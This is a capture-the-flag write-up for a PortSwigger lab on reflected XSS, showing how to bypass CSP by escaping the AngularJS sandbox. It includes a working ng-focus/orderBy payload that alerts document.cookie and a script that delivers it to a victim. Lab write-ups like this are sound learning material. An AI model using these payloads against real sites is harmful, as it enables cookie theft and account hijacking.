# Description
This lab uses CSP and AngularJS.

To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie.

# Solution
Let's start by understanding what AngularJS and CSP are.

`AngularJS`-is a JavaScript framework (by Google) for building single-page web applications. It extends HTML with directives and enables easy data binding between the model and the view.

`CSP`-is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.

To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.

After intercepting the request using BurpSuite, you will see a string like this in the response header: 

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
In this case, the directive will allow scripts to be loaded only from the same source as the page itself.

let's check if that's true

Let's enter it into the search 

```
<input>
```
<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS100.png" alt="XXS" />
</p>

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS101.png" alt="XXS" />
</p>

As you can see, it works. We can implement our scripts.

Next, we need to bypass the AngularJS sandbox and CSP:

```
<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

This payload abuses **AngularJS expression injection**. When the page loads, `#x` automatically focuses the input field, which triggers `ng-focus`. AngularJS then evaluates the expression inside `ng-focus`. The `orderBy` filter is misused to execute code: `(z=alert)` assigns the `alert` function to a variable, and `(document.cookie)` is passed to it, resulting in `alert(document.cookie)`. This happens because AngularJS evaluates the string as an expression instead of treating it as plain text.

```
<script>
location='https://0aeb0050037105b580466ceb001500b8.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```
<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS102.png" alt="XXS" />
</p>

1. Store
2. Deliver exploit to victim
